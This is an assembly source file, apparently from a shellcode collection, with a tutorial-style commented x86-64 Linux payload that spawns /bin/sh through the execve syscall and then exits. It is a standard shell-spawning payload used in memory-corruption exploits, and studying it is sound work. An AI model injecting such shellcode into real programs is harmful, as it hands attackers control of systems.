; Author: Blooper7
; Architecture: Intel x86-64

global _start

BITS 64                         ; We're writing 64 bit code

section .text
    _start:
    xor rax, rax                ; Clear all A registers
    mov rbx, '/bin/sh'          ; Only works in NASM. For other assemblers, use 0x0068732f6e69622f (null-terminated "/bin/sh" in hex)
    push rbx                    ; Send the shellcode to the stack
    mov rdi, rsp                ; Make rdi point to rsp
    xor rsi, rsi                ; Set args to none
    xor rdx, rdx                ; Set environment args to none
    mov al, 59                  ; Move the syscall number for execve to AL
    syscall                     ; Call that sucker

    mov rax, 60                 ; Syscall number for exit
    xor rdi, rdi                ; Set exit status to 0 (clean exit)
    syscall
